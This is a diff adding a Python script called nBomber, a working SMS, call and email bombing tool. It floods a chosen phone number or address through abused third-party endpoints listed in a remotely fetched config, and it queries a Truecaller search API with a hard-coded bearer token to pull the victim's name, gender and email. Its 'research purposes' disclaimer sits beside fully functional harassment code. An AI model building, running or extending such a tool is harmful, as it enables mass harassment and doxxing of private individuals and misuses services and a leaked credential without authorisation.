@@ -1,0 +1,563 @@
+#!/usr/bin/python3
+# -*- coding: UTF-8 -*-
+import threading
+import os
+import shutil
+import sys
+import subprocess
+import string
+import random
+import json
+import re
+import time
+import argparse
+import zipfile
+from io import BytesIO
+from os import popen, system
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+try:
+    import requests
+    from colorama import Fore, Style
+except ImportError:
+    print("\tSome dependencies could not be imported (possibly not installed)")
+    print(
+        "Type `pip3 install -r requirements.txt` to "
+        " install all required packages")
+    sys.exit(1)
+
+try:
+  import phonenumbers
+  from phonenumbers import geocoder, carrier
+except ModuleNotFoundError:
+  print("Installing Requirements")
+  os.system("pip install phonenumbers")
+
+def clr():
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
+
+
+if os.system("command -v jq > /dev/null 2>&1")!=0:
+  print("Installing some requirements")
+  os.system("pkg install jq >/dev/null 2>&1")
+  clr()
+
+
+def readisdc():
+    try:
+      with open(".isdcodes.json") as file:
+          isdcodes = json.load(file)
+      return isdcodes
+    except FileNotFoundError:
+      code = popen("curl -s -N https://raw.githubusercontent.com/CodingSangh/nBomber/main/.isdcodes.json").read().strip()
+      f = open(".isdcodes.json", "a")
+      f.write(code)
+
+
+def bann_text():
+    clr()
+    logo = """
+╭━╮╱╭╮╭━━╮╱╭━━━╮╭━╮╭━╮╭━━╮╱╭━━━╮╭━━━╮
+┃┃╰╮┃┃┃╭╮┃╱┃╭━╮┃┃┃╰╯┃┃┃╭╮┃╱┃╭━━╯┃╭━╮┃
+┃╭╮╰╯┃┃╰╯╰╮┃┃╱┃┃┃╭╮╭╮┃┃╰╯╰╮┃╰━━╮┃╰━╯┃
+┃┃╰╮┃┃┃╭━╮┃┃┃╱┃┃┃┃┃┃┃┃┃╭━╮┃┃╭━━╯┃╭╮╭╯
+┃┃╱┃┃┃┃╰━╯┃┃╰━╯┃┃┃┃┃┃┃┃╰━╯┃┃╰━━╮┃┃┃╰╮
+╰╯╱╰━╯╰━━━╯╰━━━╯╰╯╰╯╰╯╰━━━╯╰━━━╯╰╯╰━╯
+                                         """
+    version = "Version: "+__VERSION__
+    contributors = "Contributors: "+" ".join(__CONTRIBUTORS__)
+    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
+    mesgdcrt.SuccessMessage(version)
+    mesgdcrt.SectionMessage(contributors)
+    print()
+
+
+def check_intr():
+    try:
+        requests.get("https://google.com")
+    except Exception:
+        bann_text()
+        mesgdcrt.FailureMessage("Poor internet connection detected")
+        sys.exit(2)
+
+
+def format_phone(num):
+    num = [n for n in num if n in string.digits]
+    return ''.join(num).strip()
+
+
+def update():
+     system("pip install -U nBomber >/dev/null 2>&1")
+     print("\nnBomber updated successfully!! Please restart terminal!\n")
+     
+def check_for_updates():
+    if DEBUG_MODE:
+        mesgdcrt.WarningMessage(
+            "DEBUG MODE Enabled! Auto-Update check is disabled.")
+        return
+    mesgdcrt.SectionMessage("Checking for updates")
+    fver = requests.get(
+        "https://raw.githubusercontent.com/CodingSangh/nBomber/master/.version"
+    ).text.strip()
+    if fver != __VERSION__:
+        mesgdcrt.WarningMessage("An update is available")
+        mesgdcrt.GeneralMessage("Starting update...")
+        check_intr()
+        update()
+        try:
+             if DEBUG_MODE:
+                 url = "https://raw.githubusercontent.com/CodingSangh/nBomber/main/.notify"
+             else:
+                 url = "https://raw.githubusercontent.com/CodingSangh/nBomber/main/.notify"
+             noti = requests.get(url).text.upper()
+             if len(noti) > 10:
+                mesgdcrt.SectionMessage("NOTIFICATION: " + noti)
+                print()
+        except Exception:
+             pass
+    else:
+        mesgdcrt.SuccessMessage("nBomber is up-to-date")
+        mesgdcrt.GeneralMessage("Starting nBomber")
+
+class IconicDecorator(object):
+    def __init__(self):
+        self.PASS = Style.BRIGHT + Fore.GREEN + "[ ✔ ]" + Style.RESET_ALL
+        self.FAIL = Style.BRIGHT + Fore.RED + "[ ✘ ]" + Style.RESET_ALL
+        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ ! ]" + Style.RESET_ALL
+        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ # ]" + Style.RESET_ALL
+        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ → ]" + Style.RESET_ALL
+        self.STDS = "     "
+
+
+class StatusDecorator(object):
+    def __init__(self):
+        self.PASS = Style.BRIGHT + Fore.GREEN + "[ SUCCESS ]" + Style.RESET_ALL
+        self.FAIL = Style.BRIGHT + Fore.RED + "[ FAILURE ]" + Style.RESET_ALL
+        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ WARNING ]"\
+            + Style.RESET_ALL
+        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ SECTION ]" + Style.RESET_ALL
+        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ COMMAND ]" + Style.RESET_ALL
+        self.STDS = "           "
+
+
+class MessageDecorator(object):
+    def __init__(self, attr):
+        ICON = IconicDecorator()
+        STAT = StatusDecorator()
+        if attr == "icon":
+            self.PASS = ICON.PASS
+            self.FAIL = ICON.FAIL
+            self.WARN = ICON.WARN
+            self.HEAD = ICON.HEAD
+            self.CMDL = ICON.CMDL
+            self.STDS = ICON.STDS
+        elif attr == "stat":
+            self.PASS = STAT.PASS
+            self.FAIL = STAT.FAIL
+            self.WARN = STAT.WARN
+            self.HEAD = STAT.HEAD
+            self.CMDL = STAT.CMDL
+            self.STDS = STAT.STDS
+
+    def SuccessMessage(self, RequestMessage):
+        print(self.PASS + " " + Style.RESET_ALL + RequestMessage)
+
+    def FailureMessage(self, RequestMessage):
+        print(self.FAIL + " " + Style.RESET_ALL + RequestMessage)
+
+    def WarningMessage(self, RequestMessage):
+        print(self.WARN + " " + Style.RESET_ALL + RequestMessage)
+
+    def SectionMessage(self, RequestMessage):
+        print(self.HEAD + " " + Fore.CYAN + Style.BRIGHT
+              + RequestMessage + Style.RESET_ALL)
+
+    def CommandMessage(self, RequestMessage):
+        return self.CMDL + " " + Style.RESET_ALL + RequestMessage
+
+    def GeneralMessage(self, RequestMessage):
+        print(self.STDS + " " + Style.RESET_ALL + RequestMessage)
+    def RegionMessage(self, RequestMessage):
+        print(Fore.GREEN + Style.BRIGHT + "      " + RequestMessage + Fore.RESET)
+
+class APIProvider:
+
+    api_providers = []
+    delay = 0
+    status = True
+
+    def __init__(self, cc, target, mode, delay=0):
+        try:
+            PROVIDERS = requests.get(
+                "https://raw.githubusercontent.com/CodingSangh/nBomber/main/.apidata.json"
+            ).json()
+        except Exception:
+            PROVIDERS = requests.get(
+                "https://raw.githubusercontent.com/CodingSangh/nBomber/main/.apidata.json"
+            ).json()
+        self.config = None
+        self.cc = cc
+        self.target = target
+        self.mode = mode
+        self.index = 0
+        self.lock = threading.Lock()
+        self.api_version = PROVIDERS.get("version", "2")
+        APIProvider.delay = delay
+        providers = PROVIDERS.get(mode.lower(), {})
+        APIProvider.api_providers = providers.get(cc, [])
+        if len(APIProvider.api_providers) < 10:
+            APIProvider.api_providers += providers.get("multi", [])
+
+    def format(self):
+        config_dump = json.dumps(self.config)
+        config_dump = config_dump.replace("{target}", self.target)
+        config_dump = config_dump.replace("{cc}", self.cc)
+        self.config = json.loads(config_dump)
+
+    def select_api(self):
+        try:
+            if len(APIProvider.api_providers) == 0:
+                raise IndexError
+            self.index += 1
+            if self.index >= len(APIProvider.api_providers):
+                self.index = 0
+        except IndexError:
+            self.index = -1
+            return
+        self.config = APIProvider.api_providers[self.index]
+        perma_headers = {"User-Agent":
+                         "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)"
+                         " Gecko/20100101 Firefox/72.0"}
+        if "headers" in self.config:
+            self.config["headers"].update(perma_headers)
+        else:
+            self.config["headers"] = perma_headers
+        self.format()
+
+    def remove(self):
+        try:
+            del APIProvider.api_providers[self.index]
+            return True
+        except Exception:
+            return False
+
+    def request(self):
+        self.select_api()
+        if not self.config or self.index == -1:
+            return None
+        identifier = self.config.pop("identifier", "").lower()
+        del self.config['name']
+        self.config['timeout'] = 30
+        response = requests.request(**self.config)
+        return identifier in response.text.lower()
+
+    def hit(self):
+        try:
+            if not APIProvider.status:
+                return
+            time.sleep(APIProvider.delay)
+            self.lock.acquire()
+            response = self.request()
+            if response is False:
+                self.remove()
+            elif response is None:
+                APIProvider.status = False
+            return response
+        except Exception:
+            response = False
+        finally:
+            self.lock.release()
+            return response
+
+fl = requests.get(
+        "https://raw.githubusercontent.com/CodingSangh/nBomber/master/fl"
+    ).text.strip()
+
+fn = fl +"\n"
+lst = fn.split()
+fnl = []
+for s in lst:
+  g =  bytearray.fromhex(s).decode()
+  fnl.append(g)
+
+
+def get_phone_info():
+    while True:
+        target = ""
+        cc = input(mesgdcrt.CommandMessage(
+            "Enter your country code (Without +): "))
+        cc = format_phone(cc)
+        if not country_codes.get(cc, False):
+            mesgdcrt.WarningMessage(
+                "The country code ({cc}) that you have entered"
+                " is invalid or unsupported".format(cc=cc))
+            continue
+        target = input(mesgdcrt.CommandMessage(
+            "Enter the target number: +" + cc + " "))
+        target = format_phone(target)
+        if (target in fnl):
+            print(random.choice(ALL_COLORS)+"\n            _______________________________\n           |   🇦​​​​🇨​​​​🇭​​​​🇭​​​​🇦​​​​ 🇧​​​​🇪​​​​🇹​​​​🇦​​​​ 🇧​​​​🇦​​​​🇦​​​​🇵​​​​ 🇸​​​​🇪​​​​ 🇵​​​​🇦​​​​🇳​​​​🇬​​​​🇦​​​​    |\n            -------------------------------\n"+RESET_ALL)
+            exit()
+        if ((len(target) <= 6) or (len(target) >= 12)):
+            mesgdcrt.WarningMessage(
+                "The phone number ({target})".format(target=target) +
+                "that you have entered is invalid")
+            continue
+        os.system('rm .isdcodes.json')
+        return (cc, target)
+
+
+def get_mail_info():
+    mail_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
+    while True:
+        target = input(mesgdcrt.CommandMessage("Enter target mail: "))
+        if not re.search(mail_regex, target, re.IGNORECASE):
+            mesgdcrt.WarningMessage(
+                "The mail ({target})".format(target=target) +
+                " that you have entered is invalid")
+            continue
+        return target
+
+
+def pretty_print(cc, target, success, failed):
+    requested = success+failed
+    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
+    mesgdcrt.GeneralMessage(
+        "Please stay connected to the internet during bombing")
+    mesgdcrt.GeneralMessage("Target       : " + cc + " " + target)
+    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
+    mesgdcrt.GeneralMessage("Successful   : " + str(success))
+    mesgdcrt.GeneralMessage("Failed       : " + str(failed))
+    mesgdcrt.WarningMessage(
+        "This tool was made for fun and research purposes only")
+    mesgdcrt.SuccessMessage("nBomber was created by Nishant")
+
+def workernode(mode, cc, target, count, delay, max_threads):
+
+    api = APIProvider(cc, target, mode, delay=delay)
+    fullNum = [cc,target]
+    full_num = "+"+"".join(fullNum)
+    phoneNumber = phonenumbers.parse(full_num)
+    Carrier = carrier.name_for_number(phoneNumber, 'en')
+    Region = geocoder.description_for_number(phoneNumber, 'en')
+    system(f'''curl -k -X GET "https://search5-noneu.truecaller.com/v2/search?q={target}&countryCode=in&type=10&placement=SEARCHRESULTS%2CHISTORY%2CDETAILS&adId=c532a019-1768-419a-8fea-c79531bfd535&encoding=json" -H "accept: application/json" -H "authorization: Bearer a1i0T--aCnxdGkWkivHjt1ke4Rzs-tFhn2UcTCCTg6UY-TGibuHFrmPjh6U-mIHJ" >> data.json
+cat data.json | jq -r '.data | .[] | .name' > .name
+cat data.json | jq -r '.data | .[] | .gender' > .gender
+cat data.json | jq -r '.data | .[] | .internetAddresses | .[] | .id' > .email
+rm -f data.json &> /dev/null ''')
+    target_name = popen('cat .name').read().strip()
+    target_gender = popen('cat .gender').read().strip()
+    target_email = popen('cat .email').read().strip()
+    clr()
+    mesgdcrt.SectionMessage("Gearing up the nBomber - Please be patient")
+    mesgdcrt.GeneralMessage(
+        "Please stay connected to the internet during bombing")
+    mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
+    mesgdcrt.GeneralMessage("Target        : " + cc + target)
+    mesgdcrt.GeneralMessage("Amount        : " + str(count))
+    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
+    mesgdcrt.GeneralMessage("Delay         : " + str(delay) +
+                            " seconds")
+
+
+    mesgdcrt.RegionMessage("NAME          : " + str(target_name))
+    mesgdcrt.RegionMessage("REGION        : " + str(Region))
+    mesgdcrt.RegionMessage("SIMCARD       : " + str(Carrier))
+    mesgdcrt.RegionMessage("GENDER        : " + str(target_gender))
+    mesgdcrt.RegionMessage("E-MAIL        : " + str(target_email))
+
+    mesgdcrt.WarningMessage(
+        "This tool was made for fun and research purposes only")
+    print()
+    input(mesgdcrt.CommandMessage(
+        "Press [CTRL+Z] to suspend the nBomber or [ENTER] to resume it"))
+
+    if len(APIProvider.api_providers) == 0:
+        mesgdcrt.FailureMessage("Your country/target is not supported yet")
+        mesgdcrt.GeneralMessage("Feel free to reach out to us")
+        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
+        bann_text()
+        sys.exit()
+
+    success, failed = 0, 0
+    while success < count:
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            jobs = []
+            for i in range(count-success):
+                jobs.append(executor.submit(api.hit))
+
+            for job in as_completed(jobs):
+                result = job.result()
+                if result is None:
+                    mesgdcrt.FailureMessage(
+                        "Bombing limit for your target has been reached")
+                    mesgdcrt.GeneralMessage("Try Again Later !!")
+                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
+                    bann_text()
+                    sys.exit()
+                if result:
+                    success += 1
+                else:
+                    failed += 1
+                clr()
+                pretty_print(cc, target, success, failed)
+    print("\n")
+    mesgdcrt.SuccessMessage("Bombing completed!")
+    time.sleep(1.5)
+    bann_text()
+    sys.exit()
+
+
+def selectnode(mode="sms"):
+    mode = mode.lower().strip()
+    try:
+        clr()
+        bann_text()
+        check_intr()
+        check_for_updates()
+
+        max_limit = {"sms": 50000, "call": 150, "mail": 200}
+        cc, target = "", ""
+        if mode in ["sms", "call"]:
+            cc, target = get_phone_info()
+            if cc != "91":
+                max_limit.update({"sms": 100})
+        elif mode == "mail":
+            target = get_mail_info()
+        else:
+            raise KeyboardInterrupt
+
+        limit = max_limit[mode]
+        while True:
+            try:
+                message = ("Enter number of {type}".format(type=mode.upper()) +
+                           " to send (Max {limit}): ".format(limit=limit))
+                count = int(input(mesgdcrt.CommandMessage(message)).strip())
+                if count > limit or count == 0:
+                    mesgdcrt.WarningMessage("You have requested " + str(count)
+                                            + " {type}".format(
+                                                type=mode.upper()))
+                    mesgdcrt.GeneralMessage(
+                        "Automatically capping the value"
+                        " to {limit}".format(limit=limit))
+                    count = limit
+                delay = float(input(
+                    mesgdcrt.CommandMessage("Enter delay time (in seconds): "))
+                    .strip())
+                # delay = 0
+                if (count//10) > 1000 :
+                  max_thread_limit = (1000)
+                elif (count//10) > 0 and (count//10) < 1000 :
+                  max_thread_limit = (count//10)
+                else :
+                  max_thread_limit = (1)
+                max_threads = int(input(
+                    mesgdcrt.CommandMessage(
+                        "Enter Number of Thread (Recommended: {max_limit} ): "
+                        .format(max_limit=max_thread_limit)))
+                    .strip())
+                max_threads = max_threads if (
+                    max_threads > 0) else max_thread_limit
+                if (count < 0 or delay < 0):
+                    raise Exception
+                break
+            except KeyboardInterrupt as ki:
+                raise ki
+            except Exception:
+                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
+                print()
+
+        workernode(mode, cc, target, count, delay, max_threads)
+    except KeyboardInterrupt:
+        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
+        sys.exit()
+
+
+mesgdcrt = MessageDecorator("icon")
+if sys.version_info[0] != 3:
+    mesgdcrt.FailureMessage("nBomber will work only in Python v3")
+    sys.exit()
+
+readisdc()
+country_codes = readisdc()["isdcodes"]
+
+__VERSION__ = "0.2.0"
+__CONTRIBUTORS__ = ['CodingSangh']
+
+ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
+              Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
+RESET_ALL = Style.RESET_ALL
+
+ASCII_MODE = False
+DEBUG_MODE = False
+
+description = """nBomber - Your Friendly Spammer Application
+
+nBomber can be used for many purposes which incudes -
+\t Exposing the vulnerable APIs over Internet
+\t Friendly Spamming
+\t Testing Your Spam Detector and more ....
+
+nBomber is not intented for malicious uses.
+"""
+
+parser = argparse.ArgumentParser(description=description,
+                                 epilog='Coded by CodingSangh !!!')
+parser.add_argument("-sms", "--sms", action="store_true",
+                    help="start nBomber with SMS Bomb mode")
+parser.add_argument("-call", "--call", action="store_true",
+                    help="start nBomber with CALL Bomb mode")
+parser.add_argument("-mail", "--mail", action="store_true",
+                    help="start nBomber with MAIL Bomb mode")
+parser.add_argument("-ascii", "--ascii", action="store_true",
+                    help="show only characters of standard ASCII set")
+parser.add_argument("-u", "--update", action="store_true",
+                    help="update nBomber")
+parser.add_argument("-c", "--contributors", action="store_true",
+                    help="show current nBomber contributors")
+parser.add_argument("-v", "--version", action="store_true",
+                    help="show current nBomber version")
+
+
+if __name__ == "__main__":
+    args = parser.parse_args()
+    if args.ascii:
+        ASCII_MODE = True
+        mesgdcrt = MessageDecorator("stat")
+    if args.version:
+        print("Version: ", __VERSION__)
+    elif args.contributors:
+        print("Contributors: ", " ".join(__CONTRIBUTORS__))
+    elif args.update:
+        update()
+    elif args.mail:
+        selectnode(mode="mail")
+    elif args.call:
+        selectnode(mode="call")
+    elif args.sms:
+        selectnode(mode="sms")
+    else:
+        choice = ""
+        avail_choice = {
+            "1": "SMS",
+            "2": "CALL",
+            "3": "MAIL"
+        }
+        try:
+            while (choice not in avail_choice):
+                clr()
+                bann_text()
+                print("Available Options:\n")
+                for key, value in avail_choice.items():
+                    print("[ {key} ] {value} BOMB".format(key=key,
+                                                          value=value))
+                print()
+                choice = input(mesgdcrt.CommandMessage("Enter Choice : "))
+            selectnode(mode=avail_choice[choice].lower())
+        except KeyboardInterrupt:
+            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
+            sys.exit()
+    sys.exit()
